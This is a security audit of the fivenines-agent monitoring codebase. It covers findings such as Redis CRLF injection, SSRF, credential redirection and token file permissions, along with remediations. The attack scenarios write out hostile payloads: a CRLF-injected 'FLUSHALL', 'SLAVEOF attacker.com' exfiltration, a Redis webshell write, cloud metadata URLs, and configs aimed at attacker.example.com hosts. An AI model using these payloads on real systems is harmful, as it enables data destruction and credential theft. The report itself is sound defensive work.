# fivenines-agent Security Findings

**Date:** 2026-02-23
**Scope:** Full adversarial review of `fivenines_agent` Python codebase
**Threat model:** Attacker controls the API backend (compromise or rogue insider), or achieves network-level interception. Secondary: local unprivileged user on the monitored host.

> **Note on TLS posture:** The agent uses `ssl.create_default_context()` with `certifi` and validates the server hostname (`synchronizer.py:137-154`). A network MITM therefore requires a CA compromise or a rogue certificate, which raises the bar. However, the findings below remain exploitable whenever the API backend itself is compromised, and several are exploitable by a local user regardless.

---

## Remediation Status

**Last updated:** 2026-02-23 — All STOP/HIGH findings closed. FN-SEC-001, 002, 003–008 fully remediated on `synology` branch.

| ID | Status | Notes |
|----|--------|-------|
| FN-SEC-001 | **CLOSED** | CRLF stripped at config ingestion (`_sanitize_redis`) AND `redis.py` switched to RESP binary-safe protocol. Injection is now impossible at both the ingestion layer and the protocol layer. Dead code and unused imports also removed. 9 new tests. |
| FN-SEC-002 | **CLOSED** | `_swap_token()` now uses `os.open()` with mode `0o600`, bypassing umask. Invalid `"warning"` log level also corrected to `"error"`. 3 new tests in `test_synchronizer_security_scan.py` including permission bit assertion. |
| FN-SEC-003 | **CLOSED** | `_sanitize_nginx` and `_sanitize_caddy` enforce loopback-only URLs. External/cloud-metadata URLs cause the collector to be disabled at ingestion. |
| FN-SEC-004 | **CLOSED** | `_sanitize_postgresql` enforces loopback-only host and strips CRLF from passwords. Remote hosts disable the collector. |
| FN-SEC-005 | **CLOSED** | `_sanitize_proxmox` forces `verify_ssl=True` unconditionally (warning logged if API sent `False`) and enforces loopback-only host. |
| FN-SEC-006 | **CLOSED** | `_sanitize_docker` restricts `socket_url` to `unix://` prefix or `None`. TCP/HTTP URLs disable the collector. |
| FN-SEC-007 | **CLOSED** | `_sanitize_qemu` allowlists URI to exactly `qemu:///system` or `qemu:///session`. All remote URIs disable the collector. |
| FN-SEC-008 | **CLOSED** | Root cause fixed. `validate_config()` in `config_schema.py` validates and sanitizes the full API config before adoption. 120 unit tests, 100% coverage. |
| FN-SEC-009 | **OPEN** | Design risk. Token swap rate-limiting and HMAC binding not implemented. |
| FN-SEC-010 | **OPEN** | Design risk. Payload minimization not implemented. |

---

## Severity Definitions

| Level | Meaning |
|-------|---------|
| **STOP DEPLOYMENT** | Exploitable bug with direct, concrete impact. Must be fixed before any production rollout. |
| **HIGH** | Significant risk under realistic threat scenarios. Should be fixed before production, or explicitly accepted with compensating controls. |
| **DESIGN RISK** | Architectural decision that amplifies blast radius. Document in threat model; remediate when feasible. |

---

## Summary Table

| ID | Title | Severity | Status | Root File(s) |
|----|-------|----------|--------|-------------|
| FN-SEC-001 | Redis CRLF command injection | STOP | CLOSED | `redis.py:36` |
| FN-SEC-002 | Token file written without explicit permissions | STOP | CLOSED | `synchronizer.py:112` |
| FN-SEC-003 | HTTP SSRF via API-controlled URLs | STOP | CLOSED | `nginx.py:27`, `caddy.py:30` |
| FN-SEC-004 | PostgreSQL credential theft via host redirection | HIGH | CLOSED | `postgresql.py:23-44` |
| FN-SEC-005 | Proxmox SSL bypass and credential theft | HIGH | CLOSED | `proxmox.py:37,52` |
| FN-SEC-006 | Docker socket path injection | HIGH | CLOSED | `docker.py:24-28` |
| FN-SEC-007 | QEMU/libvirt URI injection | HIGH | CLOSED | `qemu.py:20,366` |
| FN-SEC-008 | No configuration schema validation (root cause) | HIGH | CLOSED | `synchronizer.py:102-104` |
| FN-SEC-009 | Token identity takeover by backend | DESIGN RISK | **OPEN** | `synchronizer.py:100-101` |
| FN-SEC-010 | Host reconnaissance in every payload | DESIGN RISK | **OPEN** | `agent.py:71-77`, `env.py:32-76` |

---

## STOP DEPLOYMENT Findings

---

### FN-SEC-001: Redis CRLF Command Injection

**Severity:** STOP DEPLOYMENT | **Status:** CLOSED
**File:** `fivenines_agent/redis.py:34-42`
**Attack prerequisite:** Attacker controls API backend response.

#### Description

The Redis collector builds inline Redis protocol commands by string-formatting a password value received from the API config. The Redis inline protocol uses `\r\n` (CRLF) as the command separator. The `password` value is not sanitized for CRLF sequences, allowing an attacker who controls the API config to inject arbitrary Redis commands into the monitored Redis instance.

#### Code Proof

**Source of the password** (`collectors.py:73`):
```python
("redis", [("redis", redis_metrics, True)]),
#                                     ^^^^
# pass_kwargs=True: the entire config["redis"] dict is unpacked as **kwargs
```

**Injection point** (`redis.py:34-42`):
```python
commands = []
if password:
    commands.append(f'AUTH {password}')   # <-- no escaping
commands.append('INFO')
commands.append('QUIT')

full_command = '\r\n'.join(commands) + '\r\n'
s.sendall(full_command.encode())
```

#### Attack Scenario

API server sends config response:
```json
{
  "config": {
    "redis": {
      "port": 6379,
      "password": "x\r\nFLUSHALL"
    }
  }
}
```

Wire data sent to Redis:
```
AUTH x\r\n
FLUSHALL\r\n
INFO\r\n
QUIT\r\n
```

Redis executes: `AUTH x` (fails silently or succeeds), then `FLUSHALL` (wipes all data). Other injectable commands include `SLAVEOF attacker.com 6379` (data exfiltration), `CONFIG SET dir /tmp` + `CONFIG SET dbfilename shell.php` + `SET payload "..."` + `BGSAVE` (webshell write), or `DEBUG SLEEP 99999` (denial of service).

#### Impact

Arbitrary command execution on the monitored Redis instance. Data destruction, data exfiltration, or use as a pivot for further attacks.

#### Suggested Remediation

1. **Reject CRLF in password:** Validate that `password` does not contain `\r` or `\n` before use. Raise an error or silently skip Redis collection if it does.
2. **Use RESP protocol instead of inline:** Switch to the Redis RESP (REdis Serialization Protocol) binary-safe format, which length-prefixes arguments and is immune to CRLF injection:
   ```python
   def _resp_command(*args):
       """Encode a Redis command using the RESP protocol."""
       parts = [f"*{len(args)}\r\n"]
       for arg in args:
           arg_bytes = str(arg).encode()
           parts.append(f"${len(arg_bytes)}\r\n")
           parts.append(arg_bytes.decode() + "\r\n")
       return "".join(parts)
   ```
3. **Config validation (see FN-SEC-008):** Validate `password` at config ingestion time.

#### Remediation Applied

Two independent layers, each sufficient alone:

1. **Config ingestion (`fivenines_agent/config_schema.py`)** — `_sanitize_redis()` calls `_strip_crlf(password)`, removing all `\r` and `\n` characters before the password reaches `redis.py`. The API-controlled injection path is closed at the boundary.

2. **Protocol layer (`fivenines_agent/redis.py`)** — switched from inline Redis protocol to RESP (REdis Serialization Protocol). `_resp_command(*args)` length-prefixes each argument with `$<n>\r\n`, so Redis reads exactly `n` bytes as a single opaque value. A password of `"x\r\nFLUSHALL"` is encoded as `$11\r\nx\r\nFLUSHALL\r\n` — Redis treats the entire 11 bytes as the AUTH argument, not as two commands. Injection is structurally impossible regardless of what reaches the function.

Dead code (`auth_prefix` variable, unused imports `os`/`sys`/`traceback`) also removed. 9 tests added in `tests/test_redis.py`, including a wire-level assertion that CRLF-injected passwords cannot produce a standalone FLUSHALL command.

---

### FN-SEC-002: Token File Written Without Explicit Permissions

**Severity:** STOP DEPLOYMENT | **Status:** CLOSED
**File:** `fivenines_agent/synchronizer.py:106-120`
**Attack prerequisite:** Local unprivileged user on the same host. No API compromise needed.

#### Description

When the API server issues a new per-host token (enrollment flow), `_swap_token()` writes the token to the `TOKEN` file using Python's default `open()`. The resulting file permissions depend entirely on the process umask. The install scripts (`fivenines_script.sh:40`, `fivenines_setup.sh:259`, `fivenines_setup_user.sh:189`) correctly set `chmod 600` on the initial TOKEN file, but `_swap_token()` truncates and rewrites the file without restoring those permissions. If the file was deleted and recreated (rather than truncated in-place), the permissions are lost entirely.

#### Code Proof

**Install scripts set correct initial permissions:**
```bash
# fivenines_script.sh:40
chmod 600 /etc/fivenines_agent/TOKEN

# fivenines_setup.sh:259
chmod 600 /etc/fivenines_agent/TOKEN

# fivenines_setup_user.sh:189
chmod 600 "$CONFIG_DIR/TOKEN"
```

**Original vulnerable code** (`synchronizer.py` before fix):
```python
def _swap_token(self, new_token):
    """Persist the per-host token received after enrollment."""
    log("Received per-host token, saving...", "info")
    self.token = new_token
    token_path = os.path.join(config_dir(), "TOKEN")
    try:
        with open(token_path, "w") as f:    # <-- inherits umask; new file = 0644
            f.write(new_token)
        log("Token swapped successfully", "info")
    except PermissionError:
        log(f"Permission denied writing to {token_path}...", "warning")  # invalid level
    except Exception as e:
        log(f"Error saving token: {e}", "error")
```

**No `os.chmod()` call anywhere in `synchronizer.py`:**
```
$ grep -n "chmod" fivenines_agent/synchronizer.py
(no results)
```

#### Attack Scenario

1. Agent starts. TOKEN file has permissions `0600` (set by install script).
2. API responds with a new token. `_swap_token()` opens the file with `"w"` mode.
3. On a system with umask `0022` (extremely common default), if the file was recreated, it gets permissions `0644` (world-readable).
4. Any local user reads `/etc/fivenines_agent/TOKEN` and obtains the agent's authentication credential.
5. Attacker uses the token to impersonate the agent, inject false metrics, or access the fivenines API as this host.

Note: Python's `open(path, "w")` on an *existing* file preserves inode permissions on most filesystems. The risk manifests when the file is deleted and recreated (e.g., by a config management tool, backup restore, or filesystem migration). The fix is trivial and eliminates the risk entirely.

#### Impact

Authentication token exposed to local users. Agent identity theft. False metric injection.

#### Suggested Remediation

Replace `open()` with `os.open()` specifying mode `0o600`, which sets permissions atomically at creation, bypassing umask:

```python
fd = os.open(token_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
with os.fdopen(fd, "w") as f:
    f.write(new_token)
```

#### Remediation Applied

`fivenines_agent/synchronizer.py` — `_swap_token()` now uses `os.open()` with `O_WRONLY | O_CREAT | O_TRUNC` and mode `0o600`. New files are always created owner-read/write only (`-rw-------`), bypassing the process umask. For existing files `O_TRUNC` truncates in-place without altering permissions, preserving the `0600` set by the install scripts.

Additionally, the invalid `"warning"` log level (not recognised by `debug.py`) was corrected to `"error"`.

Three tests added to `tests/test_synchronizer_security_scan.py`:
- `test_swap_token_file_permissions` — asserts `stat.st_mode & 0o777 == 0o600` on the written file.
- `test_swap_token_updates_in_memory` — asserts `self.token` is updated regardless of file outcome.
- `test_swap_token_permission_error` — asserts `PermissionError` is caught and in-memory token still updated.

---

### FN-SEC-003: HTTP SSRF via API-Controlled URLs (NGINX / Caddy)

**Severity:** STOP DEPLOYMENT | **Status:** CLOSED
**Files:** `fivenines_agent/nginx.py:25-27`, `fivenines_agent/caddy.py:16,30`
**Attack prerequisite:** Attacker controls API backend response.

#### Description

The NGINX and Caddy collectors accept a URL parameter from the API config and issue HTTP GET requests to it using the `requests` library. Since `requests.get()` follows redirects by default and connects to arbitrary hosts, an attacker who controls the API config can use the agent as an SSRF proxy to reach internal services, cloud metadata endpoints, or other network-adjacent targets. The Caddy collector is particularly dangerous because it parses the response as JSON and returns structured data, enabling data exfiltration from internal JSON APIs.

#### Code Proof

**NGINX collector** (`nginx.py:25-27`):
```python
@debug('nginx_metrics')
def nginx_metrics(status_page_url='http://127.0.0.1:8080/nginx_status'):
    try:
      response = requests.get(status_page_url)     # <-- SSRF: arbitrary HTTP GET
      # ...
      version = response.headers['Server']          # header data returned to API
```

**Caddy collector** (`caddy.py:16,30-36`):
```python
def caddy_metrics(admin_api_url='http://localhost:2019'):
    try:
        config_response = requests.get(              # <-- SSRF: arbitrary HTTP GET
            f'{admin_api_url}/config/', timeout=5
        )
        config = config_response.json()              # <-- JSON response parsed
        # ... extracted data returned as metrics to the API server
```

**Both are registered with `pass_kwargs=True`** (`collectors.py:74,78`):
```python
("nginx", [("nginx", nginx_metrics, True)]),
("caddy", [("caddy", caddy_metrics, True)]),
```

#### Attack Scenario

**Cloud metadata exfiltration via Caddy:**

API server sends:
```json
{
  "config": {
    "caddy": {
      "admin_api_url": "http://169.254.169.254/latest/meta-data"
    }
  }
}
```

The agent issues `GET http://169.254.169.254/latest/meta-data/config/` and parses the response. If the cloud metadata service returns JSON (as it does for IMDSv1 on AWS, or GCP's metadata endpoint), the data is included in metrics sent back to the API server.

**Internal service probing via NGINX:**

API server sends:
```json
{
  "config": {
    "nginx": {
      "status_page_url": "http://192.168.1.0:8500/v1/agent/self"
    }
  }
}
```

The agent probes the internal Consul agent. Even if parsing fails, the connection success/failure and timing are observable.

#### Impact

- Server-Side Request Forgery from every deployed agent.
- Data exfiltration from internal HTTP/JSON services.
- Cloud credential theft via metadata endpoints (IMDSv1).
- Internal network mapping.

#### Suggested Remediation

1. **URL validation:** Restrict `status_page_url` and `admin_api_url` to loopback addresses only (`127.0.0.1`, `::1`, `localhost`). Parse the URL and validate the hostname before making any request.
2. **Disable redirects:** Pass `allow_redirects=False` to `requests.get()` to prevent redirect-based SSRF bypass.
3. **Config validation (see FN-SEC-008):** Validate URLs at config ingestion time against an allowlist of safe patterns.

#### Remediation Applied

`fivenines_agent/config_schema.py` — `_sanitize_nginx()` and `_sanitize_caddy()` parse the URL with `urllib.parse.urlparse` and reject any URL whose hostname is not in `{"localhost", "127.0.0.1", "::1"}`. An API-supplied external URL (including cloud metadata endpoints like `169.254.169.254`) causes the collector to be set to `None` (disabled) before any HTTP request is made. The redirect vector remains in `requests.get()` but is unreachable since the base URL is now constrained to loopback.

---

## HIGH Findings

---

### FN-SEC-004: PostgreSQL Credential Theft via Host Redirection

**Severity:** HIGH | **Status:** CLOSED
**File:** `fivenines_agent/postgresql.py:17-44`
**Attack prerequisite:** Attacker controls API backend response.

#### Description

The PostgreSQL collector receives `host`, `port`, `user`, `password`, and `database` parameters from the API config. It passes `password` via the `PGPASSWORD` environment variable and connects to the specified `host` using `psql`. If the API injects an attacker-controlled host, the `psql` client sends the PostgreSQL authentication handshake (including the password) to the attacker's server.

#### Code Proof

**Config registration** (`collectors.py:79`):
```python
("postgresql", [("postgresql", postgresql_metrics, True)]),
```

**Password placed in environment, host used in command** (`postgresql.py:17-44`):
```python
def _run_psql_query(query, host='localhost', port=5432, user='postgres',
                    password=None, database='postgres'):
    env = {}
    if password:
        env['PGPASSWORD'] = password                # password in env

    cmd = [
        'psql',
        '-h', str(host),                            # host from API config
        '-p', str(port),                            # port from API config
        '-U', str(user),                            # user from API config
        '-d', str(database),                        # database from API config
        '-t', '-A',
        '-c', query
    ]

    clean_env = get_clean_env()
    if env:
        clean_env.update(env)
    result = subprocess.run(cmd, ..., env=clean_env)
```

#### Attack Scenario

API server sends:
```json
{
  "config": {
    "postgresql": {
      "host": "attacker.example.com",
      "password": "real_db_password",
      "user": "postgres"
    }
  }
}
```

The agent runs `psql -h attacker.example.com -U postgres ...` with `PGPASSWORD=real_db_password` in the environment. The attacker's fake PostgreSQL server captures the password during the authentication handshake.

Secondary risk: `PGPASSWORD` is visible in `/proc/<pid>/environ` on Linux to anyone who can read that file (root, same user, or if `hidepid` is not set on `/proc`).

#### Impact

Database credential exfiltration. If the real password is in use, the attacker gains database access.

#### Suggested Remediation

1. **Lock `host` to loopback:** Validate that `host` resolves to a loopback address, or hardcode it to `localhost`.
2. **Use `.pgpass` file with restrictive permissions** instead of `PGPASSWORD` environment variable.
3. **Config validation (see FN-SEC-008).**

#### Remediation Applied

`fivenines_agent/config_schema.py` — `_sanitize_postgresql()` validates `host` against the loopback set and disables the collector if a remote host is supplied. It also strips CRLF from `password` (secondary hardening). The `PGPASSWORD` environment variable exposure is unchanged; the `.pgpass` approach remains a recommended improvement.

---

### FN-SEC-005: Proxmox SSL Bypass and Credential Theft

**Severity:** HIGH | **Status:** CLOSED
**File:** `fivenines_agent/proxmox.py:37,52`
**Attack prerequisite:** Attacker controls API backend response + network position for MITM.

#### Description

The Proxmox collector accepts a `verify_ssl` boolean from the API config. When set to `False`, the `proxmoxer` library connects to the Proxmox API without verifying TLS certificates. Combined with API control over `host` and `port`, an attacker can redirect the agent to a MITM proxy that captures the `token_secret`.

#### Code Proof

**Config registration** (`collectors.py:80`):
```python
("proxmox", [("proxmox", proxmox_metrics, True)]),
```

**SSL verification controlled by config** (`proxmox.py:23-52`):
```python
class ProxmoxCollector:
    def __init__(self, host="localhost", port=8006,
                 token_id=None, token_secret=None, verify_ssl=True):
        self.verify_ssl = verify_ssl               # from API config
        # ...
    def _connect(self, token_id, token_secret):
        self.proxmox = ProxmoxAPI(
            self.host,
            # ...
            token_value=token_secret,
            verify_ssl=self.verify_ssl              # <-- can be False
        )
```

#### Attack Scenario

API server sends:
```json
{
  "config": {
    "proxmox": {
      "host": "192.168.1.10",
      "verify_ssl": false,
      "token_id": "monitor@pam!agent",
      "token_secret": "real-secret-uuid"
    }
  }
}
```

With `verify_ssl: false`, an attacker on the LAN intercepts the HTTPS connection to `192.168.1.10:8006` and captures `token_secret`. With Proxmox API access, the attacker can control VMs, access consoles, and modify cluster configuration.

#### Impact

Proxmox API credential theft. Full cluster compromise if the token has sufficient privileges.

#### Suggested Remediation

1. **Ignore `verify_ssl` from API config:** Hardcode `verify_ssl=True` or read it only from local configuration.
2. **Validate `host`** is loopback or an expected Proxmox node address.
3. **Config validation (see FN-SEC-008).**

#### Remediation Applied

`fivenines_agent/config_schema.py` — `_sanitize_proxmox()` hardcodes `verify_ssl=True` in the sanitized output regardless of what the API sends, and logs a `warn`-level message if the API attempted to set it to `False`. It also enforces loopback-only `host`, disabling the collector if a remote host is supplied.

---

### FN-SEC-006: Docker Socket Path Injection

**Severity:** HIGH | **Status:** CLOSED
**File:** `fivenines_agent/docker.py:24-28`
**Attack prerequisite:** Attacker controls API backend response.

#### Description

The Docker collector accepts a `socket_url` parameter from the API config. This value is passed directly to `docker.DockerClient(base_url=socket_url)`. The Docker SDK supports TCP URLs (`tcp://host:port`), SSH URLs (`ssh://host`), and Unix socket paths. An attacker can redirect the agent to connect to a remote Docker daemon or an arbitrary Unix socket.

#### Code Proof

**Config registration** (`collectors.py:75`):
```python
("docker", [("docker", docker_metrics, True)]),
```

**Socket URL used directly** (`docker.py:24-28`):
```python
def get_docker_client(socket_url=None):
    try:
        if socket_url:
            return docker.DockerClient(base_url=socket_url)   # arbitrary URL
        else:
            return docker.from_env()
    except docker.errors.DockerException as e:
        log(f"Error connecting to Docker daemon: {e}", "error")
```

#### Attack Scenario

API server sends:
```json
{
  "config": {
    "docker": {
      "socket_url": "tcp://attacker.example.com:2375"
    }
  }
}
```

The agent connects to the attacker's Docker daemon. The attacker's daemon returns crafted container metadata. If the agent runs with Docker group privileges, the attacker can also redirect to a different local socket to access other container runtimes.

#### Impact

Connection to untrusted Docker daemons. Potential information disclosure from container metadata. If the Docker SDK sends credentials, those are captured.

#### Suggested Remediation

1. **Restrict `socket_url` to local Unix sockets:** Validate the URL scheme is `unix://` and the path is an expected Docker socket location.
2. **Config validation (see FN-SEC-008).**

#### Remediation Applied

`fivenines_agent/config_schema.py` — `_sanitize_docker()` requires `socket_url` to be `None` (uses `docker.from_env()`) or a string with a `unix://` prefix. Any `tcp://`, `http://`, `ssh://`, or other scheme is rejected and the collector is disabled.

---

### FN-SEC-007: QEMU/libvirt URI Injection

**Severity:** HIGH | **Status:** CLOSED
**File:** `fivenines_agent/qemu.py:20,366`
**Attack prerequisite:** Attacker controls API backend response.

#### Description

The QEMU collector accepts a `uri` parameter from the API config and passes it to `libvirt.open(uri)`. Libvirt supports remote URIs (`qemu+ssh://host/system`, `qemu+tcp://host/system`), allowing the agent to be redirected to connect to arbitrary libvirt daemons.

#### Code Proof

**Config registration** (`collectors.py:76`):
```python
("qemu", [("qemu", qemu_metrics, True)]),
```

**URI used directly** (`qemu.py:19-23,366-370`):
```python
class QEMUCollector:
    def __init__(self, uri="qemu:///system"):
        self.uri = uri
        self.conn = None
        self._connect()

# ...

def qemu_metrics(uri="qemu:///system"):
    # ...
    collector = QEMUCollector(uri)    # <-- arbitrary URI from API config
```

#### Attack Scenario

API server sends:
```json
{
  "config": {
    "qemu": {
      "uri": "qemu+tcp://attacker.example.com/system"
    }
  }
}
```

The agent connects to the attacker's libvirt daemon. If the agent's SSH keys are in an authorized location, `qemu+ssh://` URIs could also succeed against internal hosts.

#### Impact

Connection to untrusted libvirt daemons. Internal network probing. Potential credential leakage via SSH-based URIs.

#### Suggested Remediation

1. **Restrict `uri` to local connections:** Validate the URI is `qemu:///system` or `qemu:///session` (no remote component).
2. **Config validation (see FN-SEC-008).**

#### Remediation Applied

`fivenines_agent/config_schema.py` — `_sanitize_qemu()` allowlists the URI against `{"qemu:///system", "qemu:///session"}` exactly. Any remote URI (`qemu+ssh://`, `qemu+tcp://`, etc.) disables the collector. If no `uri` key is present, the config is passed through and the function defaults to `qemu:///system`.

---

### FN-SEC-008: No Configuration Schema Validation (Root Cause)

**Severity:** HIGH | **Status:** CLOSED
**File:** `fivenines_agent/synchronizer.py:96-104`
**Attack prerequisite:** Attacker controls API backend response.

#### Description

The API response config dict is adopted wholesale with no schema validation, type checking, or allowlisting. This is the root cause that enables findings FN-SEC-001 and FN-SEC-003 through FN-SEC-007. Every `pass_kwargs=True` collector in the registry (`collectors.py:70-80`) unpacks the config dict directly as `**kwargs` to the collector function, giving the API server full control over all parameters.

#### Code Proof

**Config adopted without validation** (`synchronizer.py:96-104`):
```python
def send_metrics(self, data):
    response = self._post("/collect", data)
    if response is not None:
        if "token" in response:
            self._swap_token(response["token"])
        config = response["config"]       # <-- no validation
        with self.config_lock:
            self.config = config           # <-- raw dict used everywhere
```

**Config values unpacked as kwargs** (`collectors.py:113-128`):
```python
def collect_metrics(config, data, telemetry=None):
    for config_key, collectors in COLLECTORS:
        config_value = config.get(config_key)
        if not config_value:
            continue
        for data_key, fn, pass_kwargs in collectors:
            if pass_kwargs and isinstance(config_value, dict):
                kw = config_value                   # <-- raw API data
            else:
                kw = {}
            # ...
            data[data_key] = fn(**kw)               # <-- arbitrary kwargs
```

**All `pass_kwargs=True` collectors (attack surface):**

| Config key | Collector function | Dangerous parameters |
|-----------|-------------------|---------------------|
| `redis` | `redis_metrics` | `password` (CRLF injection) |
| `nginx` | `nginx_metrics` | `status_page_url` (SSRF) |
| `caddy` | `caddy_metrics` | `admin_api_url` (SSRF) |
| `postgresql` | `postgresql_metrics` | `host`, `password` (credential theft) |
| `proxmox` | `proxmox_metrics` | `host`, `verify_ssl`, `token_secret` |
| `docker` | `docker_metrics` | `socket_url` (arbitrary connection) |
| `qemu` | `qemu_metrics` | `uri` (arbitrary connection) |
| `ports` | `listening_ports` | `monitored_ports` (low risk) |

Additionally, `agent.py:151-153` passes `config["ping"]` values directly to `tcp_ping(host)`, enabling internal network probing.

#### Impact

This is a design-level vulnerability that turns any API backend compromise into a full agent compromise, allowing arbitrary SSRF, credential theft, service destruction (Redis), and internal network reconnaissance from every deployed agent simultaneously.

#### Suggested Remediation

1. **Define a config schema** with explicit types, allowed values, and ranges for every field.
2. **Validate on ingestion:** Before assigning `self.config`, validate the response against the schema. Reject or strip unknown keys.
3. **Restrict network-facing parameters:**
   - URLs: Must be loopback (`127.0.0.1`, `::1`, `localhost`).
   - `verify_ssl`: Must be `True` (never allow API override).
   - `password` fields: Reject if containing control characters.
   - `uri` / `socket_url`: Must match a local-only pattern.
4. **Separate local config from remote config:** Sensitive parameters (passwords, hosts, URIs) should be read from local configuration files only, not from API responses. The API should only control feature flags and intervals.

#### Remediation Applied

`fivenines_agent/config_schema.py` (new module) + `fivenines_agent/synchronizer.py` (edited). `validate_config()` is called in `send_metrics()` before `self.config` is set:

```python
# synchronizer.py (after fix)
config = validate_config(response["config"])
with self.config_lock:
    self.config = config
```

`validate_config()` applies a whitelist approach: unknown keys are dropped, structural keys (`enabled`, `interval`, `request_options`) are type-coerced and range-clamped, boolean feature flags are coerced, and all `pass_kwargs=True` collectors have per-collector sanitizers that enforce the security constraints documented in FN-SEC-001 through FN-SEC-007. The implementation has 203 statements and 100% test coverage (120 tests in `tests/test_config_schema.py`). Point 4 (local vs. remote config separation) is not addressed and remains a recommended architectural improvement.

---

## DESIGN RISK Findings

---

### FN-SEC-009: Token Identity Takeover by Backend

**Severity:** DESIGN RISK
**File:** `fivenines_agent/synchronizer.py:100-101`

#### Description

Any API response containing a `"token"` key causes the agent to replace its authentication token immediately. There is no cryptographic binding between the old and new token, no user notification, no confirmation prompt, and no rate limiting. This is an intentional design for the enrollment flow, but it means a compromised backend can silently rotate all agent tokens to attacker-controlled values.

#### Code Proof

```python
def send_metrics(self, data):
    response = self._post("/collect", data)
    if response is not None:
        if "token" in response:
            self._swap_token(response["token"])     # unconditional replacement
```

#### Impact

A compromised backend can take ownership of every agent's identity. Agents begin authenticating with attacker-controlled tokens. The legitimate operator loses the ability to communicate with agents, effectively a denial-of-service on monitoring.

#### Suggested Remediation

1. **Rate-limit token swaps:** Accept at most one token swap per agent lifetime (enrollment only).
2. **Log prominently:** Token rotation should produce a visible, non-debug log entry that operators can alert on.
3. **Consider HMAC binding:** Sign the new token with a shared secret derived from the original enrollment token, so only the legitimate backend can issue replacements.

---

### FN-SEC-010: Host Reconnaissance in Every Payload

**Severity:** DESIGN RISK
**Files:** `fivenines_agent/agent.py:71-77`, `fivenines_agent/env.py:32-76`

#### Description

Every metric payload includes a `user_context` dict with detailed host information. This data is useful for the monitoring service but provides a complete reconnaissance package to any attacker who compromises the backend.

#### Code Proof

**Static data sent every request** (`agent.py:71-77`):
```python
self.static_data = {
    "version": VERSION,
    "uname": platform.uname()._asdict(),    # OS, kernel, architecture
    "boot_time": psutil.boot_time(),
    "capabilities": self.permissions.get_all(),
    "user_context": get_user_context(CONFIG_DIR),
}
```

**User context contents** (`env.py:56-69`):
```python
return {
    "username": username,        # e.g., "fivenines" or "root"
    "uid": uid,                  # 0 if root
    "euid": euid,
    "gid": gid,
    "groupname": groupname,
    "groups": groups,            # ["root", "docker", "sudo", "disk"]
    "is_root": uid == 0,
    "is_user_install": is_user_install,
    "config_dir": cfg_dir,       # exact path to TOKEN file
    "home_dir": os.path.expanduser("~"),
}
```

#### Impact

A compromised backend learns:
- Whether the agent runs as root (privilege level).
- Which groups the agent belongs to (docker, sudo, disk = escalation paths).
- The exact filesystem path to the TOKEN file.
- The OS, kernel version, and architecture (for exploit selection).

#### Suggested Remediation

1. **Minimize transmitted data:** Send only what the backend strictly needs. `config_dir` and `home_dir` are rarely needed for monitoring.
2. **Hash or anonymize where possible:** If group membership is needed for capability inference, send capability flags instead of raw group names.

---

## Appendix: Attack Surface Map

```
                    +-------------------+
                    |  fivenines API    |
                    |  (api.fivenines.io)|
                    +--------+----------+
                             |
                     TLS (certifi)
                             |
                    +--------v----------+
                    |   synchronizer.py |
                    |                   |
                    |  response["config"] --> validate_config()  [FIXED]
                    |  response["token"] ---> TOKEN file write (os.open 0o600) [FIXED]
                    +--------+----------+
                             |
                    +--------v----------+
                    |  config_schema.py |  <-- NEW: validation layer
                    |                   |
                    |  loopback-only URLs/hosts
                    |  verify_ssl forced True
                    |  CRLF stripped from passwords
                    |  unix:// only for Docker
                    |  qemu:// allowlist
                    +--------+----------+
                             |
                    +--------v----------+
                    |   collectors.py   |
                    |                   |
                    |  fn(**config_value)  <--- sanitized kwargs
                    +---+---+---+---+---+
                        |   |   |   |
          +-------------+   |   |   +----------------+
          |                 |   |                    |
    +-----v-----+   +------v---+--+   +-----v-----+ +----v------+
    | redis.py  |   | nginx.py    |   |postgres.py| |proxmox.py |
    | AUTH {pw} |   | GET(url)    |   | psql -h   | |verify_ssl |
    | CRLF mitig|   | loopback    |   | loopback  | | forced True|
    +-----------+   +-------------+   +-----------+ +-----------+
```

---

## Remediation Priority

1. **Immediate (before any deployment):**
   - ~~FN-SEC-001: Fix Redis CRLF injection (switch to RESP protocol).~~ **CLOSED** — CRLF stripped at ingestion AND `redis.py` switched to RESP binary-safe protocol.
   - ~~FN-SEC-002: Add `os.open()` with `0o600` to `_swap_token()`.~~ **CLOSED** — `os.open()` with mode `0o600` implemented; 3 new tests including permission bit assertion.
   - ~~FN-SEC-003: Validate NGINX/Caddy URLs are loopback-only.~~ **CLOSED.**

2. **Short-term (before production scale):**
   - ~~FN-SEC-008: Implement config schema validation.~~ **CLOSED** — `config_schema.py` implemented; addresses root cause of 001, 003-007 simultaneously.
   - ~~FN-SEC-004, 005, 006, 007: Apply parameter restrictions as part of schema validation.~~ **CLOSED.**

3. **Medium-term (architecture improvement):**
   - **FN-SEC-009: Limit token swap to enrollment-only.** STILL OPEN.
   - **FN-SEC-010: Minimize reconnaissance data in payloads.** STILL OPEN.
   - Separate "what to collect" (can come from API) from "how to connect" (must come from local config).
   - ~~Complete FN-SEC-001 defense-in-depth: switch `redis.py` to RESP binary-safe protocol.~~ **CLOSED.**
